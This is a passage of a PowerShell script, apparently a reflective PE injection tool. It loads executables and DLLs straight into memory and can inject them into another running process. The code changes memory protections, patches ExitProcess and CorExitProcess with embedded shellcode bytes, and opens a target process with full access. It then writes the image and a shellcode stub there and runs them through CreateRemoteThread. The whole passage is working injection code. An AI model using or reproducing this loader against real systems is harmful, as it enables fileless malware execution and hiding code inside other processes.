				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
